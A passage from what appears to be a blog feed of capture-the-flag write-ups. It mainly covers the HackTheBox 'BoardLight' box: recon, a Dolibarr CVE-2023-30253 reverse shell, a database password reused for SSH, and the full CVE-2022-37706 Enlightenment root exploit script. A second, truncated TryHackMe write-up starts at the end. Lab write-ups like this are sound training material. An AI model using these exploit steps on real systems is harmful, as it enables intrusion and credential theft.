class="hljs-variable constant_">PORT</span>   <span class="hljs-variable constant_">STATE</span> <span class="hljs-variable constant_">SERVICE</span> <span class="hljs-variable constant_">VERSION</span><span class="hljs-number">22</span>/tcp open  ssh     <span class="hljs-title class_">OpenSSH</span> <span class="hljs-number">8.</span>2p1 <span class="hljs-title class_">Ubuntu</span> 4ubuntu0<span class="hljs-number">.11</span> (<span class="hljs-title class_">Ubuntu</span> <span class="hljs-title class_">Linux</span>; protocol <span class="hljs-number">2.0</span>)| ssh-<span class="hljs-attr">hostkey</span>: |   <span class="hljs-number">3072</span> <span class="hljs-number">06</span>:2<span class="hljs-attr">d</span>:3<span class="hljs-attr">b</span>:<span class="hljs-number">85</span>:<span class="hljs-number">10</span>:<span class="hljs-number">59</span>:<span class="hljs-attr">ff</span>:<span class="hljs-number">73</span>:<span class="hljs-number">66</span>:<span class="hljs-number">27</span>:7<span class="hljs-attr">f</span>:0<span class="hljs-attr">e</span>:<span class="hljs-attr">ae</span>:<span class="hljs-number">03</span>:<span class="hljs-attr">ea</span>:f4 (<span class="hljs-variable constant_">RSA</span>)|   <span class="hljs-number">256</span> <span class="hljs-number">59</span>:<span class="hljs-number">03</span>:<span class="hljs-attr">dc</span>:<span class="hljs-number">52</span>:<span class="hljs-number">87</span>:3<span class="hljs-attr">a</span>:<span class="hljs-number">35</span>:<span class="hljs-number">99</span>:<span class="hljs-number">34</span>:<span class="hljs-number">44</span>:<span class="hljs-number">74</span>:<span class="hljs-number">33</span>:<span class="hljs-number">78</span>:<span class="hljs-number">31</span>:<span class="hljs-number">35</span>:fb (<span class="hljs-variable constant_">ECDSA</span>)|_  <span class="hljs-number">256</span> <span class="hljs-attr">ab</span>:<span class="hljs-number">13</span>:<span class="hljs-number">38</span>:<span class="hljs-attr">e4</span>:3<span class="hljs-attr">e</span>:<span class="hljs-attr">e0</span>:<span class="hljs-number">24</span>:<span class="hljs-attr">b4</span>:<span class="hljs-number">69</span>:<span class="hljs-number">38</span>:<span class="hljs-attr">a9</span>:<span class="hljs-number">63</span>:<span class="hljs-number">82</span>:<span class="hljs-number">38</span>:<span class="hljs-attr">dd</span>:f4 (<span class="hljs-title class_">ED25519</span>)<span class="hljs-number">80</span>/tcp open  http    <span class="hljs-title class_">Apache</span> httpd <span class="hljs-number">2.4</span><span class="hljs-number">.41</span> ((<span class="hljs-title class_">Ubuntu</span>))|_http-<span class="hljs-attr">title</span>: <span class="hljs-title class_">Site</span> doesn<span class="hljs-string">&#x27;t have a title (text/html; charset=UTF-8).</span><span class="hljs-string">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><span class="hljs-string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></code></pre><h2 id="Services"><a href="#Services" class="headerlink" title="Services"></a>Services</h2><h3 id="TCP-22-Default-Port-for-ssh"><a href="#TCP-22-Default-Port-for-ssh" class="headerlink" title="TCP 22 (Default Port for ssh)"></a>TCP 22 (Default Port for ssh)</h3><p>-&gt; SSH package version - Might be able to find the OS and version.</p><p>-&gt; SSH key fingerprint - Has the key been re-used somewhere (Another machine? Same machine, just another port&#x2F;service?)</p><p>-&gt; SSH banner - Any text (if at all) before the password prompt (often get legal warnings about connecting to it)</p><p>-&gt; SSH package version:</p><pre><code class="hljs jsx">nc -vn <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.11</span> <span class="hljs-number">22</span></code></pre><ul><li>output:</li></ul><pre><code class="hljs jsx">└─$ nc -vn <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.11</span> <span class="hljs-number">22</span>         (<span class="hljs-variable constant_">UNKNOWN</span>) [<span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.11</span>] <span class="hljs-number">22</span> (ssh) open<span class="hljs-variable constant_">SSH</span>-<span class="hljs-number">2.0</span>-<span class="hljs-title class_">OpenSSH</span>_8.2p1 <span class="hljs-title class_">Ubuntu</span>-4ubuntu0<span class="hljs-number">.11</span></code></pre><p>-&gt; SSH key fingerprint:</p><pre><code class="hljs jsx">ssh root@<span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.11</span></code></pre><ul><li>output:</li></ul><pre><code class="hljs jsx">└─$ ssh root@<span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.11</span>                                             <span class="hljs-title class_">The</span> authenticity <span class="hljs-keyword">of</span> host <span class="hljs-string">&#x27;10.10.11.11 (10.10.11.11)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><span class="hljs-string">ED25519 key fingerprint is SHA256:xngtcDPqg6MrK72I6lSp/cKgP2kwzG6rx2rlahvu/v0.</span><span class="hljs-string">This key is not known by any other names.</span><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><span class="hljs-string">Warning: Permanently added &#x27;</span><span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.11</span><span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span></code></pre><h3 id="TCP-80-Default-Port-for-HTTP"><a href="#TCP-80-Default-Port-for-HTTP" class="headerlink" title="TCP 80 (Default Port for HTTP)"></a>TCP 80 (Default Port for HTTP)</h3><ul><li><blockquote><p>Web Server:</p></blockquote></li></ul><pre><code class="hljs jsx">└─$ curl -i <span class="hljs-attr">http</span>:<span class="hljs-comment">//10.10.11.11| head -n 50</span>  % <span class="hljs-title class_">Total</span>    % <span class="hljs-title class_">Received</span> % <span class="hljs-title class_">Xferd</span>  <span class="hljs-title class_">Average</span> <span class="hljs-title class_">Speed</span>   <span class="hljs-title class_">Time</span>    <span class="hljs-title class_">Time</span>     <span class="hljs-title class_">Time</span>  <span class="hljs-title class_">Current</span>                                 <span class="hljs-title class_">Dload</span>  <span class="hljs-title class_">Upload</span>   <span class="hljs-title class_">Total</span>   <span class="hljs-title class_">Spent</span>    <span class="hljs-title class_">Left</span>  <span class="hljs-title class_">Speed</span>  <span class="hljs-number">0</span>     <span class="hljs-number">0</span>    <span class="hljs-number">0</span>     <span class="hljs-number">0</span>    <span class="hljs-number">0</span>     <span class="hljs-number">0</span>      <span class="hljs-number">0</span>      <span class="hljs-number">0</span> --:--:-- --:--:-- --:--:--     0HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">200</span> <span class="hljs-variable constant_">OK</span><span class="hljs-title class_">Date</span>: <span class="hljs-title class_">Tue</span>, <span class="hljs-number">16</span> <span class="hljs-title class_">Jul</span> <span class="hljs-number">2024</span> <span class="hljs-number">19</span>:<span class="hljs-number">11</span>:<span class="hljs-number">02</span> <span class="hljs-variable constant_">GMT</span><span class="hljs-title class_">Server</span>: <span class="hljs-title class_">Apache</span>/<span class="hljs-number">2.4</span><span class="hljs-number">.41</span> (<span class="hljs-title class_">Ubuntu</span>)<span class="hljs-title class_">Vary</span>: <span class="hljs-title class_">Accept</span>-<span class="hljs-title class_">Encoding</span><span class="hljs-title class_">Transfer</span>-<span class="hljs-title class_">Encoding</span>: chunked<span class="hljs-title class_">Content</span>-<span class="hljs-title class_">Type</span>: text/html; charset=<span class="hljs-variable constant_">UTF</span>-<span class="hljs-number">8</span>&lt;!<span class="hljs-variable constant_">DOCTYPE</span> html&gt;&lt;html&gt;&lt;head&gt;  &lt;!-- Basic --&gt;  &lt;meta charset=&quot;utf-8&quot; /&gt;  &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot; /&gt;  &lt;!-- Mobile Metas --&gt;  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot; /&gt;  &lt;!-- Site Metas --&gt;  &lt;meta name=&quot;keywords&quot; content=&quot;&quot; /&gt;  &lt;meta name=&quot;description&quot; content=&quot;&quot; /&gt;  &lt;meta name=&quot;author&quot; content=&quot;&quot; /&gt;  &lt;!-- slider stylesheet --&gt;  &lt;!-- slider stylesheet --&gt;  &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/assets/owl.carousel.min.css&quot; /&gt;  &lt;!-- bootstrap core css --&gt;  &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/bootstrap.css&quot; /&gt;  &lt;!-- fonts style --&gt;  &lt;link href=&quot;https://fonts.googleapis.com/css?family=Open+Sans:400,700|Poppins:400,700&amp;display=swap&quot; rel=&quot;stylesheet&quot;&gt;  &lt;!-- Custom styles for this template --&gt;  &lt;link href=&quot;css/style.css&quot; rel=&quot;stylesheet&quot; /&gt;  &lt;!-- responsive style --&gt;  &lt;link href=&quot;css/responsive.css&quot; rel=&quot;stylesheet&quot; /&gt;&lt;/head&gt;&lt;body&gt;  &lt;div class=&quot;hero_area&quot;&gt;    &lt;!-- header section strats --&gt;    &lt;header class=&quot;header_section&quot;&gt;      &lt;div class=&quot;container-fluid&quot;&gt;        &lt;nav class=&quot;navbar navbar-expand-lg custom_nav-container pt-3&quot;&gt;          &lt;a class=&quot;navbar-brand&quot; href=&quot;index.php&quot;&gt;            &lt;span&gt;                          &lt;/span&gt;          &lt;/a&gt;          &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-toggle=&quot;collapse&quot; data-target=&quot;#navbarSupportedContent&quot; aria-controls=&quot;navbarSupportedContent&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt;            &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt;100 15949    0 15949    0     0  63750      0 --:--:-- --:--:-- --:--:-- 63541curl: Failed writing body</code></pre><h1 id="Directory-Busting"><a href="#Directory-Busting" class="headerlink" title="Directory Busting"></a>Directory Busting</h1><p>Directory busting with Gobuster involves using the tool to brute-force and enumerate hidden directories and files on a web server.</p><ul><li>command used:</li></ul><pre><code class="hljs jsx">gobuster dir -u <span class="hljs-attr">http</span>:<span class="hljs-comment">//10.10.11.11 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</span></code></pre><p>-&gt; output:</p><pre><code class="hljs jsx">/images               (<span class="hljs-title class_">Status</span>: <span class="hljs-number">301</span>) [<span class="hljs-title class_">Size</span>: <span class="hljs-number">311</span>] [--&gt; <span class="hljs-attr">http</span>:<span class="hljs-comment">//10.10.11.11/images/]</span><span class="hljs-regexp">/css                  (Status: 301) [Size: 308] [--&gt; http://10.10.11.11/css/]</span><span class="hljs-regexp">/</span>js                   (<span class="hljs-title class_">Status</span>: <span class="hljs-number">301</span>) [<span class="hljs-title class_">Size</span>: <span class="hljs-number">307</span>] [--&gt; <span class="hljs-attr">http</span>:<span class="hljs-comment">//10.10.11.11/js/]</span></code></pre><p>On &#x2F;images we find Information Disclosure:</p><pre><code class="hljs jsx"><span class="hljs-title class_">Forbidden</span><span class="hljs-title class_">You</span> don<span class="hljs-string">&#x27;t have permission to access this resource.</span><span class="hljs-string">Apache/2.4.41 (Ubuntu) Server at 10.10.11.11 Port 80</span></code></pre><h1 id="Subdomain-Enumeration"><a href="#Subdomain-Enumeration" class="headerlink" title="Subdomain Enumeration"></a>Subdomain Enumeration</h1><p>Add the IP Address to <code>/etc/hosts</code> as board.htb</p><p>Subdomain enumeration with wfuzz</p><ul><li>command used:</li></ul><pre><code class="hljs jsx">─$ wfuzz -w <span class="hljs-title class_">SecLists</span>/<span class="hljs-title class_">Discovery</span>/<span class="hljs-variable constant_">DNS</span>/subdomains-top1million-<span class="hljs-number">110000.</span>txt -H <span class="hljs-string">&quot;HOST: FUZZ.board.htb&quot;</span> -u <span class="hljs-attr">http</span>:<span class="hljs-comment">//board.htb --hw 1053</span></code></pre><p>-&gt; output:</p><pre><code class="hljs jsx">********************************************************* <span class="hljs-title class_">Wfuzz</span> <span class="hljs-number">3.1</span><span class="hljs-number">.0</span> - <span class="hljs-title class_">The</span> <span class="hljs-title class_">Web</span> <span class="hljs-title class_">Fuzzer</span>                         *********************************************************<span class="hljs-title class_">Target</span>: <span class="hljs-attr">http</span>:<span class="hljs-comment">//board.htb/</span><span class="hljs-title class_">Total</span> <span class="hljs-attr">requests</span>: <span class="hljs-number">114441</span>=====================================================================<span class="hljs-variable constant_">ID</span>           <span class="hljs-title class_">Response</span>   <span class="hljs-title class_">Lines</span>    <span class="hljs-title class_">Word</span>       <span class="hljs-title class_">Chars</span>       <span class="hljs-title class_">Payload</span>                                                                                                                                                                    =====================================================================<span class="hljs-number">000000072</span>:   <span class="hljs-number">200</span>        <span class="hljs-number">149</span> L    <span class="hljs-number">504</span> W      <span class="hljs-number">6360</span> <span class="hljs-title class_">Ch</span>     <span class="hljs-string">&quot;crm - crm&quot;</span></code></pre><p>Found crm.board.htb, add it to &#x2F;etc&#x2F;hosts </p><p>Tried a xss script on the login form from <code>crm.board.htb</code> and we got this error : </p><pre><code class="hljs jsx"><span class="hljs-title class_">Access</span> refused to <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.67</span> by <span class="hljs-variable constant_">SQL</span> or <span class="hljs-title class_">Script</span> injection protection <span class="hljs-keyword">in</span> main.<span class="hljs-property">inc</span>.<span class="hljs-property">php</span> - <span class="hljs-variable constant_">GETPOST</span> type=<span class="hljs-number">0</span> paramkey=username paramvalue=<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span> page=/index.<span class="hljs-property">php</span>?mainmenu=<span class="hljs-variable constant_">USER</span></code></pre><p>In the end we don’t find anything related to xss.</p><p>Open crm.board.htb:</p><p><img src="/../BoardLight_img/1.png" alt="alt text"></p><p>Found an exploit for this (CVE-2023-30253)</p><p><img src="/../BoardLight_img/2.png" alt="alt text"></p><p>We found some default creds:</p><p><img src="/../BoardLight_img/3.png" alt="alt text"></p><p>It actually worked!</p><h1 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h1><p>Download the github exploit and run it in one tab while in other tab open a netcat listener:</p><pre><code class="hljs bash">python3 [exploit.py](http://exploit.py/) [http://crm.board.htb](http://crm.board.htb/) admin admin 10.10.14.34 4444</code></pre><pre><code class="hljs bash">└─$ nc -lvnp 3009</code></pre><p>Boom we get reverse shell:</p><p><img src="/../BoardLight_img/4.png" alt="alt text"></p><pre><code class="hljs bash">www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ <span class="hljs-built_in">id</span><span class="hljs-built_in">id</span>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)</code></pre><p>On <code>~/html/crm.board.htb/htdocs$</code> a lot of directories but we do find a conf file so let’s check it out:</p><p><img src="/../BoardLight_img/5.png" alt="alt text"></p><p>→output:</p><pre><code class="hljs bash">&lt;?php//// File generated by Dolibarr installer 17.0.0 on May 13, 2024//// Take a look at conf.php.example file <span class="hljs-keyword">for</span> an example of conf.php file// and explanations <span class="hljs-keyword">for</span> all possibles parameters.//<span class="hljs-variable">$dolibarr_main_url_root</span>=<span class="hljs-string">&#x27;http://crm.board.htb&#x27;</span>;<span class="hljs-variable">$dolibarr_main_document_root</span>=<span class="hljs-string">&#x27;/var/www/html/crm.board.htb/htdocs&#x27;</span>;<span class="hljs-variable">$dolibarr_main_url_root_alt</span>=<span class="hljs-string">&#x27;/custom&#x27;</span>;<span class="hljs-variable">$dolibarr_main_document_root_alt</span>=<span class="hljs-string">&#x27;/var/www/html/crm.board.htb/htdocs/custom&#x27;</span>;<span class="hljs-variable">$dolibarr_main_data_root</span>=<span class="hljs-string">&#x27;/var/www/html/crm.board.htb/documents&#x27;</span>;<span class="hljs-variable">$dolibarr_main_db_host</span>=<span class="hljs-string">&#x27;localhost&#x27;</span>;<span class="hljs-variable">$dolibarr_main_db_port</span>=<span class="hljs-string">&#x27;3306&#x27;</span>;<span class="hljs-variable">$dolibarr_main_db_name</span>=<span class="hljs-string">&#x27;dolibarr&#x27;</span>;<span class="hljs-variable">$dolibarr_main_db_prefix</span>=<span class="hljs-string">&#x27;llx_&#x27;</span>;<span class="hljs-variable">$dolibarr_main_db_user</span>=<span class="hljs-string">&#x27;dolibarrowner&#x27;</span>;<span class="hljs-variable">$dolibarr_main_db_pass</span>=<span class="hljs-string">&#x27;serverfun2$2023!!&#x27;</span>;<span class="hljs-variable">$dolibarr_main_db_type</span>=<span class="hljs-string">&#x27;mysqli&#x27;</span>;<span class="hljs-variable">$dolibarr_main_db_character_set</span>=<span class="hljs-string">&#x27;utf8&#x27;</span>;<span class="hljs-variable">$dolibarr_main_db_collation</span>=<span class="hljs-string">&#x27;utf8_unicode_ci&#x27;</span>;// Authentication settings<span class="hljs-variable">$dolibarr_main_authentication</span>=<span class="hljs-string">&#x27;dolibarr&#x27;</span>;//<span class="hljs-variable">$dolibarr_main_demo</span>=<span class="hljs-string">&#x27;autologin,autopass&#x27;</span>;// Security settings<span class="hljs-variable">$dolibarr_main_prod</span>=<span class="hljs-string">&#x27;0&#x27;</span>;<span class="hljs-variable">$dolibarr_main_force_https</span>=<span class="hljs-string">&#x27;0&#x27;</span>;<span class="hljs-variable">$dolibarr_main_restrict_os_commands</span>=<span class="hljs-string">&#x27;mysqldump, mysql, pg_dump, pgrestore&#x27;</span>;<span class="hljs-variable">$dolibarr_nocsrfcheck</span>=<span class="hljs-string">&#x27;0&#x27;</span>;<span class="hljs-variable">$dolibarr_main_instance_unique_id</span>=<span class="hljs-string">&#x27;ef9a8f59524328e3c36894a9ff0562b5&#x27;</span>;<span class="hljs-variable">$dolibarr_mailing_limit_sendbyweb</span>=<span class="hljs-string">&#x27;0&#x27;</span>;<span class="hljs-variable">$dolibarr_mailing_limit_sendbycli</span>=<span class="hljs-string">&#x27;0&#x27;</span>;//<span class="hljs-variable">$dolibarr_lib_FPDF_PATH</span>=<span class="hljs-string">&#x27;&#x27;</span>;//<span class="hljs-variable">$dolibarr_lib_TCPDF_PATH</span>=<span class="hljs-string">&#x27;&#x27;</span>;//<span class="hljs-variable">$dolibarr_lib_FPDI_PATH</span>=<span class="hljs-string">&#x27;&#x27;</span>;//<span class="hljs-variable">$dolibarr_lib_TCPDI_PATH</span>=<span class="hljs-string">&#x27;&#x27;</span>;//<span class="hljs-variable">$dolibarr_lib_GEOIP_PATH</span>=<span class="hljs-string">&#x27;&#x27;</span>;//<span class="hljs-variable">$dolibarr_lib_NUSOAP_PATH</span>=<span class="hljs-string">&#x27;&#x27;</span>;//<span class="hljs-variable">$dolibarr_lib_ODTPHP_PATH</span>=<span class="hljs-string">&#x27;&#x27;</span>;//<span class="hljs-variable">$dolibarr_lib_ODTPHP_PATHTOPCLZIP</span>=<span class="hljs-string">&#x27;&#x27;</span>;//<span class="hljs-variable">$dolibarr_js_CKEDITOR</span>=<span class="hljs-string">&#x27;&#x27;</span>;//<span class="hljs-variable">$dolibarr_js_JQUERY</span>=<span class="hljs-string">&#x27;&#x27;</span>;//<span class="hljs-variable">$dolibarr_js_JQUERY_UI</span>=<span class="hljs-string">&#x27;&#x27;</span>;//<span class="hljs-variable">$dolibarr_font_DOL_DEFAULT_TTF</span>=<span class="hljs-string">&#x27;&#x27;</span>;//<span class="hljs-variable">$dolibarr_font_DOL_DEFAULT_TTF_BOLD</span>=<span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-variable">$dolibarr_main_distrib</span>=<span class="hljs-string">&#x27;standard&#x27;</span>;</code></pre><p>We find some credentials:</p><pre><code class="hljs bash"><span class="hljs-variable">$dolibarr_main_db_user</span>=<span class="hljs-string">&#x27;dolibarrowner&#x27;</span>;<span class="hljs-variable">$dolibarr_main_db_pass</span>=<span class="hljs-string">&#x27;serverfun2$2023!!&#x27;</span></code></pre><p>Found user larissa:</p><pre><code class="hljs bash">larissa:x:1000:1000:larissa,,,:/home/larissa:/bin/bash</code></pre><p>Log in with ssh as larissa with the password found previously:</p><pre><code class="hljs bash">└─$ ssh larissa@10.10.11.11    </code></pre><p><img src="/../BoardLight_img/6.png" alt="alt text"></p><p>User.txt Flag: <code>7e690a8593a02c9ce82f294f4afcc895</code></p><h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h1><p>Uploading linpeas to the victim’s machine:</p><pre><code class="hljs bash">wget http://10.10.14.34:8000/linpeas.sh</code></pre><p><img src="/../BoardLight_img/7.png" alt="alt text"></p><p>Linpeas found <code>enlightement</code> with interesting permissions and we searched on google and found an exploit for this:</p><p><a href="https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/blob/main/exploit.sh">https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/blob/main/exploit.sh</a></p><p>→ Copy the content of the exploit and create a file <code>exploit.sh</code>  on the victim machine :</p><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;CVE-2022-37706&quot;</span><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[*] Trying to find the vulnerable SUID file...&quot;</span><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[*] This may take few seconds...&quot;</span>file=$(find / -name enlightenment_sys -perm -4000 2&gt;/dev/null | <span class="hljs-built_in">head</span> -1)<span class="hljs-keyword">if</span> [[ -z <span class="hljs-variable">$&#123;file&#125;</span> ]]<span class="hljs-keyword">then</span><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[-] Couldn&#x27;t find the vulnerable SUID file...&quot;</span><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[*] Enlightenment should be installed on your system.&quot;</span><span class="hljs-built_in">exit</span> 1<span class="hljs-keyword">fi</span><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[+] Vulnerable SUID binary found!&quot;</span><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[+] Trying to pop a root shell!&quot;</span><span class="hljs-built_in">mkdir</span> -p /tmp/net<span class="hljs-built_in">mkdir</span> -p <span class="hljs-string">&quot;/dev/../tmp/;/tmp/exploit&quot;</span><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/sh&quot;</span> &gt; /tmp/exploit<span class="hljs-built_in">chmod</span> a+x /tmp/exploit<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[+] Enjoy the root shell :)&quot;</span><span class="hljs-variable">$&#123;file&#125;</span> /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(<span class="hljs-built_in">id</span> -u), <span class="hljs-string">&quot;/dev/../tmp/;/tmp/exploit&quot;</span> /tmp///net</code></pre><p>Now change executable permissions to the exploit and run it :</p><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +x exploit.sh</code></pre><p>→ Run</p><pre><code class="hljs bash">./exploit.s</code></pre><p>→ </p><p><img src="/../BoardLight_img/8.png" alt="alt text"></p><p>Get Root:</p><p><img src="/../BoardLight_img/9.png" alt="alt text"></p><p>Root.txt Flag: <code>f1cc47f19a4c7a3f34cf04625874e8fa</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> CTF </tag>
            
            <tag> Easy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnNet Endgame</title>
      <link href="/2024/07/25/VulnNet-Endgame/"/>
      <url>/2024/07/25/VulnNet-Endgame/</url>
      
        <content type="html"><![CDATA[<p><img src="/../vulnnet_img/1*wgtCXijSBgpfJctApuRK4A.png" alt="alt text"></p><p><strong>Target IP Address: 10.10.81.70</strong></p><h1 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h1><h2 id="NMAP-Scaning"><a href="#NMAP-Scaning" class="headerlink" title="NMAP Scaning"></a>NMAP Scaning</h2><p>Nmap scans network ports to determine their status (open, closed, or filtered), identifies services running on them, and detects their versions.</p><ul><li>command used:</li></ul><pre><code class="hljs bash">sudo nmap -p- -sS --min-rate 5000 --open -T5 -vvv -Pn</code></pre><p>→ output:</p><pre><code class="hljs sql">PORT   STATE SERVICE REASON<span class="hljs-number">22</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span>  ssh     syn<span class="hljs-operator">-</span>ack ttl <span class="hljs-number">63</span><span class="hljs-number">80</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span>  http    syn<span class="hljs-operator">-</span>ack ttl <span class="hljs-number">63</span></code></pre><h2 id="NMAP-FULL-Scanning"><a href="#NMAP-FULL-Scanning" class="headerlink" title="NMAP FULL Scanning"></a>NMAP FULL Scanning</h2><ul><li>command used: (scanning the ports we got)</li></ul><pre><code class="hljs bash">└─$  nmap -A -sC -sV -p22,80 10.10.81.70 -Pn</code></pre><p>→ output:</p><pre><code class="hljs bash">PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 bb:2e:e6:cc:79:f4:7d:68:2c:11:bc:4b:63:19:08:af (RSA)|   256 80:61:bf:8c:aa:d1:4d:44:68:15:45:33:ed:eb:82:a7 (ECDSA)|_  256 87:86:04:e9:e0:c0:60:2a:ab:87:8e:9b:c7:05:35:1c (ED25519)80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Site doesn<span class="hljs-string">&#x27;t have a title (text/html).</span><span class="hljs-string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></code></pre><h2 id="Services"><a href="#Services" class="headerlink" title="Services"></a>Services</h2><h3 id="TCP-22-Default-Port-for-ssh"><a href="#TCP-22-Default-Port-for-ssh" class="headerlink" title="TCP 22 (Default Port for ssh)"></a>TCP 22 (Default Port for ssh)</h3><p>-&gt; SSH package version - Might be able to find the OS and version.</p><p>-&gt; SSH key fingerprint - Has the key been re-used somewhere (Another machine? Same machine, just another port&#x2F;service?)</p><p>-&gt; SSH banner - Any text (if at all) before the password prompt (often get legal warnings about connecting to it)</p><p>-&gt; SSH package version:</p><pre><code class="hljs bash">└─$ nc -vn 10.10.81.70 22(UNKNOWN) [10.10.81.70] 22 (ssh) openSSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.7</code></pre><p>-&gt; SSH key fingerprint:</p><pre><code class="hljs bash">ssh root@10.10.81.70The authenticity of host <span class="hljs-string">&#x27;10.10.81.70 (10.10.81.70)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><span class="hljs-string">ED25519 key fingerprint is SHA256:UwSqcCjp07h7qqubWx22AY0AsygwXw11Ii1arCJSLyA.</span><span class="hljs-string">This key is not known by any other names.</span><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])?</span></code></pre><h3 id="TCP-80-Default-Port-for-HTTP"><a href="#TCP-80-Default-Port-for-HTTP" class="headerlink" title="TCP 80 (Default Port for HTTP)"></a>TCP 80 (Default Port for HTTP)</h3><p>→ WebServer:</p><pre><code class="hljs bash">└─$ curl -i http://10.10.81.70 | <span class="hljs-built_in">head</span> -n 50  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed100    65  100    65    0     0     57      0  0:00:01  0:00:01 --:--:--    57HTTP/1.1 200 OKDate: Tue, 23 Jul 2024 11:29:28 GMTServer: Apache/2.4.29 (Ubuntu)Last-Modified: Tue, 14 Jun 2022 16:06:52 GMTETag: <span class="hljs-string">&quot;41-5e16a97c78054&quot;</span>Accept-Ranges: bytesContent-Length: 65Content-Type: text/htmlOur services are accessible only through the vulnnet.thm domain!</code></pre><p>Our services are accessible only through the vulnnet.thm domain!<br>Alright let’s add vulnnet.thm to &#x2F;etc&#x2F;hosts</p><p>Trying again:</p><pre><code class="hljs bash">$ curl -i http://10.10.81.70 | <span class="hljs-built_in">head</span> -n 50  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed100    65  100    65    0     0    519      0 --:--:-- --:--:-- --:--:--   520HTTP/1.1 200 OKDate: Tue, 23 Jul 2024 11:30:57 GMTServer: Apache/2.4.29 (Ubuntu)Last-Modified: Tue, 14 Jun 2022 16:06:52 GMTETag: <span class="hljs-string">&quot;41-5e16a97c78054&quot;</span>Accept-Ranges: bytesContent-Length: 65Content-Type: text/htmlOur services are accessible only through the vulnnet.thm domain!                                                                                                                                                                          ┌──(kali㉿kali)-[~/Desktop/Workspace/TryHackMe]└─$ curl -i http://vulnnet.thm | <span class="hljs-built_in">head</span> -n 50  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed100  4346  100  4346    0     0   5859      0 --:--:-- --:--:-- --:--:--  5857HTTP/1.1 200 OKDate: Tue, 23 Jul 2024 11:31:06 GMTServer: Apache/2.4.29 (Ubuntu)Last-Modified: Thu, 02 Jun 2022 17:15:30 GMTETag: <span class="hljs-string">&quot;10fa-5e07a2716f080&quot;</span>Accept-Ranges: bytesContent-Length: 4346Vary: Accept-EncodingContent-Type: text/html&lt;!DOCTYPE html&gt;&lt;!--[<span class="hljs-keyword">if</span> lt IE 7]&gt;      &lt;html class=<span class="hljs-string">&quot;no-js lt-ie9 lt-ie8 lt-ie7&quot;</span>&gt; &lt;![endif]--&gt;&lt;!--[<span class="hljs-keyword">if</span> IE 7]&gt;         &lt;html class=<span class="hljs-string">&quot;no-js lt-ie9 lt-ie8&quot;</span>&gt; &lt;![endif]--&gt;&lt;!--[<span class="hljs-keyword">if</span> IE 8]&gt;         &lt;html class=<span class="hljs-string">&quot;no-js lt-ie9&quot;</span>&gt; &lt;![endif]--&gt;&lt;!--[<span class="hljs-keyword">if</span> gt IE 8]&gt;&lt;!--&gt; 